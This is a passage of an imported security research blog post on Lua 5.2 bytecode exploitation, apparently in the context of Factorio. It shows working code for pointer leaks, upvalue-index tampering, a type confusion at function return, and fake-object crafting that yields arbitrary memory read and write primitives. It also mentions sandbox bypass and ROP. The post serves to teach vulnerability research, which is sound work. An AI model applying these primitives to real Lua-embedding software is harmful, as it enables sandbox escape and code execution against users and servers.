---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-29_bytecode-breakdown-unraveling-factorios-lua-security-flaws.md
original_filename: 2024-06-29_bytecode-breakdown-unraveling-factorios-lua-security-flaws.md
title: 'Bytecode Breakdown: Unraveling Factorio''s Lua Security Flaws'
category: documents
detected_topics:
- command-injection
- sso
- path-traversal
- otp
- automation-abuse
- race-condition
tags:
- imported
- documents
- command-injection
- sso
- path-traversal
- otp
- automation-abuse
- race-condition
language: en
raw_sha256: 3802985b7590380bbb3c71c22e9bf6a220748b825c52249846834848746e3f95
text_sha256: 7096b07945fd44fe5b616bb503a82dbca3a3a83f80e5eca5e369ff6191fa3929
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: true
---

# Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-29_bytecode-breakdown-unraveling-factorios-lua-security-flaws.md
- Source Type: markdown
- Detected Topics: command-injection, sso, path-traversal, otp, automation-abuse, race-condition
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: True
- Raw SHA256: `3802985b7590380bbb3c71c22e9bf6a220748b825c52249846834848746e3f95`
- Text SHA256: `7096b07945fd44fe5b616bb503a82dbca3a3a83f80e5eca5e369ff6191fa3929`


## Content

---
title: "Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws"

This is also **why the exponent of our leaked value was -1022**. As our number was denormalized and it was indicated by the first part of the output, the exponent is no longer useful for us (as it only indicated that is denormalized, which we already knew), so it seems to be fixed at `-1022`, the smallest representable exponent.

##### Are we double yet?

There are basically **two cases** we need to handle:

  * **Denormalized Numbers** : the integer value fits in the _mantissa_ , we decode the mantissa to obtain the correct double.
  * **Normal numbers** : the value _does not fit in the mantissa_. The best we can do to recover the original value is to calculate the number as `(exponent + 1023) * 2^52 + mantissa` (if the number is not representable as a double, we lose data doing this)

If we really wanted to handle _any number_ without losing data, we could store the value in **two doubles** and make functions to operate with them as an `integer`

Here is a Lua implementation of this idea:
  
  
  function double_to_number(double)
  -- Force representation of mantissa with 13 bytes of precision
  local double_as_string = string.format("%.13a", double)
  local denormalized, mantissa, exponent = string.match(double_as_string,
  "-?0x([a-fx0-9]*).([a-f0-9]*)p?(-?[0-9]*)")
  
  -- Convert to number
  denormalized = tonumber(denormalized, 16)
  mantissa = tonumber(mantissa, 16)
  exponent = tonumber(exponent)
  
  if denormalized == 0 then
  -- If denormalized, it means that the leaked value had zeros
  -- in the position of the exponent
  -- That means the number fits the mantissa, 
  -- so we don't have to do anything with our new double to represent it
  real_exponent = 0 
  else
  -- In this case, the leaked value had a value different
  -- value from zero in the exponent.
  -- That means the number does NOT fit the mantissa.
  -- We need to calculate the real value and then
  -- try to represent it as a double
  real_exponent = (exponent + 1023) * 2^52 -- Shift 52 bits (size of mantissa)
  end
  
  return real_exponent + mantissa
  end
  

Which we can finally add to our `FORLOOP` code to transform the leaked pointer
  
  
  foo = "Memory Corruption"
  
  leak = asnum(foo)
  print("Leak: " .. leak)
  print(string.format("Pointer: 0x%x", double_to_number(leak)))
  -- Output:
  -- Leak: 2.1965605260578e-317
  -- Pointer: 0x43d6c0
  

We can then check in GDB that `0x43d6c0` is in fact the correct pointer:
  
  
  pwndbg> x/20s 0x43d6c0
  0x43d6c0:	"\340nC"
  0x43d6c4:	""
  0x43d6c5:	""
  0x43d6c6:	""
  0x43d6c7:	""
  0x43d6c8:	"\004\002"
  0x43d6cb:	""
  0x43d6cc:	"\222\311X+\021"
  0x43d6d2:	""
  0x43d6d3:	""
  0x43d6d4:	""
  0x43d6d5:	""
  0x43d6d6:	""
  0x43d6d7:	""
  0x43d6d8:	"Memory Corruption"
  0x43d6ea:	""
  0x43d6eb:	""
  0x43d6ec:	""
  0x43d6ed:	""
  0x43d6ee:	""
  

Our string is not exactly at the address leaked as we leaked the address of a TString structure, the internal representation of strings in Lua
  
  
  type = union TString {
  /*  8 */  L_Umaxalign dummy;
  /*  24 */  struct {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /*  10  |  1 */  lu_byte extra;
  /* XXX  1-byte hole  */
  /*  12  |  4 */  unsigned int hash;
  /*  16  |  8 */  size_t len;
  /* total size (bytes):  24 */
  } tsv;
  
  /* total size (bytes):  24 */
  }
  

The real string is after this header, that is, `24 bytes` after the leaked pointer:
  
  
  pwndbg> x/s 0x43d6c0+24
  0x43d6d8:	"Memory Corruption"
  

## Confusing Upvalues

Now that we have a way to leak addresses, we need a primitive that allows us to retrieve fake objects. To do this, we first need to understand how **upvalues** and **Closures** work in Lua.

### What are Upvalues?

**Upvalues** are a way **to access variables outside the scope of the current function**. Consider the following example that calculates the Fibonacci secuence:
  
  
  function fibonacci(n)
  local a = 1
  local b = 1
  
  function nextValue()
  -- 'a' and 'b' are upvalues, as they are defined in the outer function
  return a + b
  end
  
  for i=0, n do
  tmp = a
  a = nextValue()
  b = tmp
  end
  return b
  end
  

The `nextValue` function accesses both `a` and `b` variables even if they are outside its scope, that is because both variables are defined as upvalues. We can see that this is true by taking a look at its bytecode:
  
  
  upvalues (2) for nextValue:
  0	a	1	1
  1	b	1	2
  

The format of the upvalues section is the following:

  1. **Index** : position in the upvalues array of the function
  2. **Name** : name of the upval
  3. **In Stack** : indicates if the upval is located in the stack (one if located in the stack)
  4. **Stack Index** : offset of the upval from the base address of the stack

So we know that both `a` and `b` are upvalues located in the stack, with `a` located at `base + 1` and `b` at `base + 2`

### The Gift that Keeps on Giving

As you might start thinking, we control the bytecode that gets loaded, and **upvalues are defined in the bytecode** , _what happens if we modify the index of an upvalue to point to a different offset of the stack?_

Let’s try it, first we define a function that has three upvalues
  
  
  function()
  local foo
  local bar
  local target
  (function()
  print(foo)
  print(bar)
  print(target)
  end)()
  end
  

If we execute the code _without any modification to the bytecode_ , we get `nil` as the output, as the upvalues haven’t been assigned any value yet
  
  
  [MemoryCorruption src]$ ./lua poc.lua 
  nil
  nil
  nil
  

Now we are going to **manipulate the index** of the `target` upval. To do this, we need to know its current position:

The `_ENV` upvalue is used to get the address of the `print` function, and is not important for our purposes 
  
  
  upvalues (4) for 0xd587a0:
  0	_ENV	0	0
  1	foo	1	0
  2	bar	1	1
  3	target	1	2
  

As it is currently `2`, we are going to increase it to `3`. We can do that with this code:
  
  
  poc = string.dump(function()
  local foo
  local bar
  local target
  (function()
  print(foo)
  print(bar)
  print(target)
  end)()
  end)
  -- Modify upvalue index of target to be idx + 1
  poc = poc:gsub("(\x00\x00\x01\x00\x01\x01\x01)\x02", "%1\x03", 1)
  poc = load(poc)
  poc()
  

Here we _dump the bytecode_ of the function with `string.dump` and then modify the index of the last upvalue with a substitution. We use `"(\x00\x00\x01\x00\x01\x01\x01)\x02"` as the pattern because each upvalue has one byte to indicate if it is located in the stack and another to indicate the index, making it unique enough for our purpose.

Execution of the **manipulated bytecode** reveals something interesting:
  
  
  [MemoryCorruption src]$ ./lua poc.lua 
  nil
  nil
  LClosure: 0x7a6d00
  

An _unmodified version of Lua_ will return `function` instead of `LClosure`, as the default `print` function considers closures functions 

Instead of `nil`, we got an `LClosure`, _but what is an LClosure?_ To understand it, **we need to know how functions work in Lua**

#### Closures and Prototypes

**Prototypes** are created when loading bytecode or when parsing the source code of a Lua script. As such, we could say that _prototypes_ are the **real functions** , as they contain all the information we would commonly associate with a function, like its bytecode, the start and end line of source code where it was defined, constants used…

They act kinda as a _template_ for functions
  
  
  typedef struct Proto {
  CommonHeader;
  TValue *k;  /* constants used by the function */
  Instruction *code;
  struct Proto **p;  /* functions defined inside the function */
  int *lineinfo;  /* map from opcodes to source lines (debug information) */
  LocVar *locvars;  /* information about local variables (debug information) */
  Upvaldesc *upvalues;  /* upvalue information */
  union Closure *cache;  /* last created closure with this prototype */
  TString  *source;  /* used for debug information */
  int sizeupvalues;  /* size of 'upvalues' */
  int sizek;  /* size of `k' */
  int sizecode;
  int sizelineinfo;
  int sizep;  /* size of `p' */
  int sizelocvars;
  int linedefined;
  int lastlinedefined;
  GCObject *gclist;
  lu_byte numparams;  /* number of fixed parameters */
  lu_byte is_vararg;
  lu_byte maxstacksize;  /* maximum stack used by this function */
  } Proto;
  

On the other hand, **Closures** are created **during execution of the Lua script** and associate a **Prototype** with its **Upvalues**.
  
  
  typedef struct LClosure {
  ClosureHeader;
  struct Proto *p; /* Function associated with the LClosure */
  UpVal *upvals[1];  /* list of upvalues */
  } LClosure;
  

The existence of **Closures** is what allows Lua to **implement upvalues** , as they abstract a function from its **upvals**. This is important as **the same function can have different upvals** on each call

We can see this mechanism in work with a function that returns a counter:
  
  
  function createCounter()
  -- On each call, a new local variable is created
  local count = 0
  return function ()
  -- Count is an upval of this function
  count = count + 1
  return count
  end
  end
  
  first_counter = createCounter()
  second_counter = createCounter()
  -- Increase the first counter
  print("Counter 1: " .. first_counter())
  -- Increase the second counter
  print("Counter 2: " .. second_counter())
  

In this code, the `createCounter` function returns a new function that can be used to increase an **upvalue** of the `createCounter` function. As a new `count` variable is created on each call, the function will return a different `LCLosure` when called. The same **prototype** will be used, as _they are the same funcion_ , but a different **upval** will be associated with it 9

#### Wait, is all TValues?

By modifying the index of the upvalue, we got a reference to the current function closure, that is because `LClosures` are **pushed to the stack on creation** and **just before upvalues are asigned to it**.
  
  
  /*
  ** create a new Lua closure, push it in the stack, and initialize
  ** its upvalues.
  */
  static void pushclosure (lua_State *L, Proto *p, UpVal **encup, StkId base,
  StkId ra) {
  int nup = p->sizeupvalues;
  Upvaldesc *uv = p->upvalues;
  int i;
  Closure *ncl = luaF_newLclosure(L, nup);
  ncl->l.p = p;
  setclLvalue(L, ra, ncl);  /* anchor new closure in stack */
  for (i = 0; i < nup; i++) {  /* fill in its upvalues */
  if (uv[i].instack)  /* upvalue refers to local variable? */
  ncl->l.upvals[i] = luaF_findupval(L, base + uv[i].idx);
  else  /* get upvalue from enclosing function */
  ncl->l.upvals[i] = encup[uv[i].idx];
  }
  luaC_barrierproto(L, p, ncl);
  p->cache = ncl;  /* save it on cache for reuse */
  }
  

The position of the `LClosure` in the stack depends on the opcode `CLOSURE`, which as the name indicates, is reponsible for the creation of closures in Lua and is defined as:
  
  
  R(A) := closure(KPROTO[Bx])
  

This basically means to create a new **Closure** based on the **prototype at position Bx** of the current _function prototype_ array of prototypes (function prototypes are stored in the prototype of the function that defined it), and store it at position `R(A)`, which is a macro that means `base + A`, so at an offset from the current function stack (which seems to always be just after the local variables).

This explains why when we modified the index of the last _upval_ we got the `LClosure` of the function
  
  
  function (4 instructions at 0x225b540)
  0 params, 4 slots, 1 upvalue, 3 locals, 0 constants, 1 function
  1	[19]	LOADNIL  0 2
  2	[28]	CLOSURE  3 0	; 0x225bc80
  3	[22]	CALL  3 1 1
  4	[29]	RETURN  0 1
  constants (0) for 0x225b540:
  locals (3) for 0x225b540:
  0	foo	2	5
  1	bar	2	5
  2	target	2	5
  upvalues (1) for 0x225b540:
  0	_ENV	0	0
  

As our function had **three locals** , the `CLOSURE` opcode has `3` as the `A` parameter, meaning that the `LClosure` is stored at `base + 3`. When we modified the last upval to point to the index **3** , we got the `TValue` stored at `base + 3`, that is, the **LClosure**.

As closures are **first class citizens** in Lua, they are also a `TValue`, so they are no more especial than any other variable.

#### TOCTOU: Type of Check != Type of Use

We just learned that _Closures_ are like any other variable in Lua. This arises a question, _what prevents a user from calling a variable like a string as a function and crash Lua?_

The answer, as you can imagine, is a **type check** when trying to call a `TValue`
  
  
  int luaD_precall (lua_State *L, StkId func, int nresults) {
  lua_CFunction f;
  CallInfo *ci;
  int n;  /* number of arguments (Lua) or returns (C) */
  ptrdiff_t funcr = savestack(L, func);
  switch (ttype(func)) {
  case LUA_TLCF:  /* light C function */
  f = fvalue(func);
  goto Cfunc;
  case LUA_TCCL: {  /* C closure */
  /* Redacted */
  return 1;
  }
  case LUA_TLCL: {  /* Lua function: prepare its call */
  /* Redacted */
  return 0;
  }
  default: {  /* not a function */
  func = tryfuncTM(L, func);  /* retry with 'function' tag method */
  return luaD_precall(L, func, nresults);  /* now it must be a function */
  }
  }
  }
  

This seems like a banal question, but it has _implicit consequences_ , if the type of the `TValue` was checked before being able to call it, as it makes sense to do, why would they check the type **during** execution of the function?

_What happens if we replace the LClosure with other type of TValue? Are there type checks to prevent this?_ Let’s experiment with this idea and replace the `LClosure` with a `String`
  
  
  poc = string.dump(function()
  local foo
  local bar
  local target
  (function()
  print(foo)
  print(bar)
  print(target)
  target = "AAAAAAAAAAAAAAAA" -- Replace LClosure with String
  print(target)
  end)()
  end)
  -- Modify upvalue index of target to be idx + 1
  poc = poc:gsub("(\x00\x00\x01\x00\x01\x01\x01)\x02", "%1\x03", 1)
  poc = load(poc)
  poc()
  

Not much seems to happen:
  
  
  [MemoryCorruption src]$ ./lua ~/Downloads/lua-5.2.1/src/poc.lua 
  nil
  nil
  LClosure: 0x1c57e20
  AAAAAAAAAAAAAAAA
  

_Why is that?_ As we are not calling any other function after overwritting the `LClosure`, **its value is not being used**.

_But what happens if we corrupt the previous`LClosure`? How does that affect the execution when Lua returns to the function?_ Let’s see it
  
  
  poc = string.dump(function()
  local foo
  local bar
  local target
  (function() -- [1] target points to this function LClosure
  (function()
  print(foo)
  print(bar)
  print(target)
  -- [2] The inner function overwrites the outer function LClosure
  target = "AAAAAAAAAAAAAAAA"
  -- [3] Lua returns to the corrupted LClosure
  end)()
  end)()
  end)
  -- Modify upvalue index of target to be idx + 1
  poc = poc:gsub("(\x00\x00\x01\x00\x01\x01\x01)\x02", "%1\x03", 1)
  poc = load(poc)
  poc()
  

This time the inner function is overwritting the `LClosure` of the outer function instead of modiying their own `LClosure`
  
  
  [MemoryCorruption src]$ ./lua poc.lua 
  nil
  nil
  LClosure: 0x21b1130
  Segmentation fault (core dumped)
  

We can see in GDB that the crash happens because Lua is **trying to use our TValue as a LClosure in the change of frame code**
  
  
  ──[ REGISTERS ]
  *RAX  0x4141414141414141 ('AAAAAAAA')
  ──[ DISASM ]
  ► 0x419d17 <luaV_execute+56>  mov  rax, qword ptr [rax + 0x10]
  ──[ SOURCE ]
  In file: lua-5.2.1/src/lvm.c
  604  TValue *k;
  605  StkId base;
  606  newframe:  /* reentry point when frame changes (call/return) */
  607  lua_assert(ci == L->ci);
  608  cl = clLvalue(ci->func);
  ► 609  k = cl->p->k;
  610  base = ci->u.l.base;
  611  /* main loop of interpreter */
  612  for (;;) {
  613  Instruction i = *(ci->u.l.savedpc++);
  614  StkId ra;
  

These are great news, as now the `cl` variable, that points to the current `LClosure` in **execution** , is pointing to our `TString` and not to the real `LClosure`.

This is possible because the **type check in the return opcode is not enforced**. Instead of forcing a type check, like in the `luaD_precall` function before a call, the `lua_assert` macro is used, and as we learned before, it **does nothing by default**
  
  
  vmcasenb(OP_RETURN,
  int b = GETARG_B(i);
  if (b != 0) L->top = ra+b-1;
  if (cl->p->sizep > 0) luaF_close(L, base);
  b = luaD_poscall(L, ra);
  if (!(ci->callstatus & CIST_REENTRY))  /* 'ci' still the called one */
  return;  /* external invocation: return */
  else {  /* invocation via reentry: continue execution */
  ci = L->ci;
  if (b) L->top = ci->top;
  // This type check would prevent this type confusion,
  // but is disabled by default
  lua_assert(isLua(ci));
  lua_assert(GET_OPCODE(*((ci)->u.l.savedpc - 1)) == OP_CALL);
  goto newframe;  /* restart luaV_execute over new Lua function */
  }
  )
  

To understand how we can leverage this, we first need to know **what attributes we are in control of** when we confuse a `TString` with a `LClosure`

Bytes | LClosure | TString  
---|---|---  
0-7 | GCObject *next | GCObject *next  
8 | lu_byte tt | lu_byte tt  
9 | lu_byte marked | lu_byte marked  
10 | lu_byte nupvalues | lu_byte extra  
11-15 | Padding | Padding + unsigned int hash  
16-23 | GCObject *gclist | size_t len  
24-31 | **Proto *p** | **start of user content**  
32-40 | **Upval **upval** | **rest of string**  
  
As we can see, **the type confusion gives us total control** of both the `Proto` and `Upval` pointers, as the user content of a **string** is stored in those offsets.

This is important because we gain control over the **pointer to the function prototype and the array of upvalues of the current frame**. If we point these pointers to an area of memory we control, for example, _another string_ , we could create **fake objects** , the **most powerful primitive in a dynamic language**.

### Creating Fake Objects

From this point, there are two paths, we either create a Fake `Proto` that points to an array of fake `TValues`, or we can create a fake `UpVal` array that points to our `TValues`. They lead to the same outcome, so I recomment following the _Constants_ path, as you need **less padding** , and also **regain the ability to use constants** in your function, which is nice

![Fake Objects](/posts/rce-lua-factorio/fakeobjs.svg) Possible paths to create Fake Objects from a LClosure we control

Let’s start by creating a **fake string**. Fake strings are interesting as they can be used as a **read primitive** by creating a one with the **max length possible**.

This is useful in many cases and can even be the end goal of our exploit (as we might just want to _demonstrate access to customer data in memory_)

As we will follow the **path of constants** , we need to create:

  * The Fake String
  * An array of `TValues`, with one pointing to our fake string
  * A Fake `Proto` that points to the Array of `TValues`
  * A Fake `LClosure` that points to our fake `Proto`

#### 1\. Fake String

In Lua, strings are represented with the `TString` union:

While crafting fake objects, use the definition of the structure provided by GDB, as it includes **paddings**
  
  
  pwndbg> ptype /o TString
  
  type = union TString {
  /*  8 */  L_Umaxalign dummy;
  /*  24 */  struct {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /*  10  |  1 */  lu_byte extra;
  /* XXX  1-byte hole  */
  /*  12  |  4 */  unsigned int hash;
  /*  16  |  8 */  size_t len;
  /* total size (bytes):  24 */
  } tsv;
  /* total size (bytes):  24 */
  }
  

As our goal is to **create a string with an arbitrary len** , our string will have 24 bytes where the last 8 bytes represent the length of our string
  
  
  -- Convert little endian uint64 to char[8]
  local function ub8(n)
  local t = {}
  for i = 1, 8 do
  local b = n % 256
  t[i] = string.char(b)
  n = (n - b) / 256
  end
  return table.concat(t)
  end
  
  --  next + tt/marked/extra/padding/hash + len
  fakeStr = ub8(0x0) .. ub8(0x0) .. ub8(0x1337) 
  

#### 2\. Fake Array of TValues

Next, we need to create the `TValue` that points to this `TString`, as we already know, `TValues` have two parts, the `Value` and the `type`
  
  
  pwndbg> ptype /o TValue
  
  type = struct lua_TValue {
  /*  0  |  8 */  Value value_;
  /*  8  |  4 */  int tt_;
  /* XXX  4-byte padding  */
  /* total size (bytes):  16 */
  }
  

So we have to create a string with **two 64 bit values** , the first will be a _pointer_ to the fake `TString` we created before, and the second the type of the `TValue`

Remember that a `TString` has a header of **24 bytes before the user data** , so we need to take that into account while calculating pointers to the content of the string 
  
  
  -- Value + Type (LUA_TSTRING = 4)
  fakeTValueArray = ub8(addr_of(fakeStr) + 24) .. ub8(4)
  

If we wanted to add another fake object, we just have to concat it as this is supposed to be an array of `TValues`
  
  
  -- Value + Type (LUA_TSTRING = 4) / Value + Type (LUA_TNUMBER = 3)
  fakeTValueArray = ub8(addr_of(fakeStr) + 24) .. ub8(4) ..  ub8(0) .. ub8(3)
  

#### 3\. Fake Proto

Then we need to create a **Fake Proto** that points to our fake array of `TValues`
  
  
  pwndbg> ptype /o Proto
  type = struct Proto {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /* XXX  6-byte hole  */
  /*  16  |  8 */  TValue *k;
  /*  24  |  8 */  Instruction *code;
  /*  32  |  8 */  struct Proto **p;
  /*  40  |  8 */  int *lineinfo;
  /*  48  |  8 */  LocVar *locvars;
  /*  56  |  8 */  Upvaldesc *upvalues;
  /*  64  |  8 */  union Closure *cache;
  /*  72  |  8 */  TString *source;
  /*  80  |  4 */  int sizeupvalues;
  /*  84  |  4 */  int sizek;
  /*  88  |  4 */  int sizecode;
  /*  92  |  4 */  int sizelineinfo;
  /*  96  |  4 */  int sizep;
  /*  100  |  4 */  int sizelocvars;
  /*  104  |  4 */  int linedefined;
  /*  108  |  4 */  int lastlinedefined;
  /*  112  |  8 */  GCObject *gclist;
  /*  120  |  1 */  lu_byte numparams;
  /*  121  |  1 */  lu_byte is_vararg;
  /*  122  |  1 */  lu_byte maxstacksize;
  /* XXX  5-byte padding  */
  
  /* total size (bytes):  128 */
  }
  

In our case, as we are only interested in controlling the `k` pointer (the pointer to the constants), we can do this:
  
  
  -- Fake proto that points the constants array
  fakeProto = ub8(0x0) .. ub8(0x0) .. ub8(addr_of(fakeTValueArray) + 24)
  

#### 4\. Fake LClosure

Finally, we create a fake `LClosure` that points to our fake `Proto` structure. As the user content of a string perfectly aligns with the location of the `Proto` pointer in a real `LClosure`, creating it is straighforward:
  
  
  fakeClosure = ub8(addr_of(fakeProto) + 24)
  

With this fake `LClosure`, we now have all the parts needed to craft an object. We will update the code that replaces the `LClosure` with the following that also returns the crafted object
  
  
  craft_object = string.dump(function(closure)
  local target
  return (function(closure) -- [1] target points to this function LClosure
  (function(closure)
  -- [2] The inner function overwrites the outer function LClosure
  target = closure
  end)(closure)
  -- [3] The LOADK opcode reads the constant
  -- from our fake LCLosure array of constants,
  -- so instead of 42 this returns our fake object
  return 42
  -- We need to return an additional value to prevent a TAILCALL
  -- that would mess up with the Call frame
  end)(closure), 1337
  end)
  -- Replace the stack index of target upval to point to the LCLosure
  -- of the first function
  craft_object = craft_object:gsub("(target\x00\x01\x00\x00\x00\x01)\x01", "%1\x02", 1)
  craft_object = load(craft_object)
  

Notice how we both return the result of the inner function (the crafted object) and a constant `1337`. We do this because when doing `return function()`, Lua uses a `TAILCALL` opcode to do the call. This opcode allows **infinite recursion** without growing the stack, as the current call frame will be used for the inner function.

This is **not what we want** , the change of frame needs to happen so our fake `LClosure` gets used as the current frame. By also returning a constant we prevent Lua from using a `TAILCALL` operation, **forcing a change of frame**.

With this updated piece of code, we just have to call the `craft_object` primitive with our fake `LCLosure` to obtain our fake object.
  
  
  read_primitive = craft_object(fakeClosure)
  print(string.format("Size of string: %x", #read_primitive))
  --Output: Size of string: 1337
  

### The Tables Have Turned

From this point, with the ability to create fake objects, all the features of Lua are now your **weapons** :

  * **TStrings** : allow to **leak data**
  * **Tables** : can be used to write data to arbitrary addresses
  * **CCLosure/Light C Functions** : allow to _obtain control of the instruction pointer_. Which has multiple uses: 
  * **Bypass sandboxes** : we can recover access to Lua functions that might be sandboxed but still present in the binary by pointing a fake function to its address
  * **Execute ROP Chains** : as we control the instruction pointer, we can execute _ROP chains_

The path to take will depend both on your goals and the application where Lua is embedded.

### Generic Primitives

#### Finishing our read primitive

Previously, we created our **first fake object** , a `TString`. We already said that this is a powerful fake object, as it can be used to leak data, so let’s finish building this read primitive.

To do this, we start by updating the size of our fake string from `0x1337` to a bigger number, so we can reach more data from its position.
  
  
  --  next + tt/marked/extra/padding/hash + len
  fakeStr = ub8(0x0) .. ub8(0x0) .. ub8(0x20000000000000) 
  

Now, we need to create a function that given a fake string, tries to read from an address we provide. As we already know, Lua assumes that the string is located after the `TString` header, that means that **we are limited to leaking data after the header**. As `TStrings` are located in the _heap_ , we will only be able to read data located in the heap or after it.

The following code can be used to read data from an address we provide given a fake string that is within reach of the target:

In Lua, **Strings are indexed starting from 1**. This means that `str:sub(0, 1)` and `str:sub(1, 1)` return the same character. To take that into account we will consider the header of the `TString` one byte smaller 
  
  
  function read(fake_string, addr, size)
  -- First we calculate if the address is reachable from our position
  local relative_addr = addr - (addr_of(fake_string) + 23)
  
  if relative_addr < 0 then
  print("[-] Cannot read from " .. addr)
  error()
  end
  
  -- Then we obtain the part of the string where the data is located
  return fake_string:sub(relative_addr, relative_addr + size - 1)
  end
  

#### Building a Write-What-Where Primitive

In addition to leaking memory, we would like to **corrupt memory** so we can alter the behaviour of the program.

There are multiple ways to do this, so we are going to do the one that I think is the **simplest**.

The idea is to create a _fake UpValue_ that points to the address we want to write. By doing this, Lua will think that the address we provided contains a `TValue`, so this is similar to the way we crafted fake objects, but the diference is that instead of retrieving this fake object, we are going to **overwrite it with a numeric value**.

_Why are we going to do this?_ Because writing to a variable means to change the **underlying TValue** with a new `TValue` that represents the new object. As Lua thinks the address we provide contains the `TValue` of the variable we are writing to, Lua is going to write the new `TValue` in that position, and as we already know, **numeric values are stored inline** in the `TValue` structure, so **we control the first 8 bytes of the structure that gets written** to the address provided.
  
  
  write_primitive = string.dump(function(closure, value)
  local target
  (function(closure, value) -- [1] target points to this function LClosure
  (function(closure)
  -- [2] The inner function overwrites the outer function LClosure
  target = closure
  end)(closure)
  -- [3] Target now points to the address we want to write to.
  -- Changing its value means writting a TValue in that address
  target = value
  end)(closure, value)
  end)
  write_primitive = write_primitive:gsub("(target\x00\x01\x00\x00\x00\x01)\x02", "%1\x03", 1)
  write_primitive = load(write_primitive)
  

Unfortunately, in the process we will also **corrupt the next 8 bytes with the type of the TValue** , but this might be okay depending on where we are writting to.
  
  
  type = struct lua_TValue {
  /*  0  |  8 */  Value value_;
  /*  8  |  4 */  int tt_;
  /* XXX  4-byte padding  */
  /* total size (bytes):  16 */
  }
  

Implementation is really simple. We start by creating a fake `UpVal` structure inside a string that points to the address where we want to write:
  
  
  pwndbg> ptype /o UpVal
  type = struct UpVal {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /* XXX  6-byte hole  */
  /*  16  |  8 */  TValue *v;
  /*  24  |  16 */  union {
  /*  16 */  TValue value;
  /*  16 */  struct {
  /*  24  |  8 */  struct UpVal *prev;
  /*  32  |  8 */  struct UpVal *next;
  /* total size (bytes):  16 */
  } l;
  
  /* total size (bytes):  16 */
  } u;
  
  /* total size (bytes):  40 */
  }
  

That means the following code:
  
  
  -- next/tt/marked + Address of the TValue (v)
  fakeUpVal = "AAAABBBBCCCCDDDD".. ub8(addr)
  

Then, is just a matter of creating a fake `LClosure` where we control the `UpVals` array
  
  
  -- proto + upvals
  fakeClosure = ub8(addr_of("MemoryCorruption")) .. ub8(addr_of(fakeUpVal) + 24)
  

Our primitive will be like the following:
  
  
  function write(addr, value)
  -- The Fake Upval points to the destination of the write
  fakeUpVal = "AAAABBBBCCCCDDDD".. ub8(addr) -- next/tt/marked + v
  
  -- Fake closure that we use to overwrite the real closure
  fakeClosure = ub8(addr_of("MemoryCorruption")) .. ub8(addr_of(fakeUpVal) + 24) -- proto + upvals
  
  write_primitive(fakeClosure, value)
  end
  
  write(0x4545454545, 0x5050505050)
  

